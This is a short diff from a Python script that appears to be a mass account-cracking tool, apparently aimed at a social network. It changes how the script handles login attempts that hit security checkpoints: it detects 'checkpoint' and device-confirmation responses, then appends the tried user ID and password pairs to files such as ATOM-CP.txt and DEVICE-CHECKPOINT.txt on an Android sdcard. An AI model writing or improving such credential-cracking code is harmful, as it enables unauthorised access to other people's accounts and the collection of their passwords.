@@ -1478,15 +1478,15 @@ def p(uid,pwx,tl):
                 else:
                     break
             elif "checkpoint" in po.lower():
-               if "confirm your identity on another device" in po.lower() or "log in from a device" in po.lower():
-                  print(f"[device cnfrm cp] {uid}|{pw}")
-                  open("/sdcard/ATOM-ALL-FILE/DEVICE-CHECKPOINT.txt", "a").write(f"{uid}|{pw}\n")
-                  cps.append(uid)
-               else:
-                  print(f"[GENERAL CHECKPOINT] {uid}|{pw}")
-                  open("/sdcard/ATOM-ALL-FILE/ATOM-CP.txt", "a").write(f"{uid}|{pw}\n")
-                  cps.append(uid)
-    break
+                 #print(f"[GENERAL CHECKPOINT] {uid}|{pw}")
+                 open("/sdcard/ATOM-ALL-FILE/ATOM-CP.txt", "a").write(f"{uid}|{pw}\n")
+                 cps.append(uid)
+                 break
+            elif "confirm your identity on another device" in po.lower() or "log in from a device" in po.lower():
+                 print(f"[device cnfrm cp] {uid}|{pw}")
+                 open("/sdcard/ATOM-ALL-FILE/DEVICE-CHECKPOINT.txt", "a").write(f"{uid}|{pw}\n")
+                 cps.append(uid)
+                 break
             else:
                 continue
         loop+=1
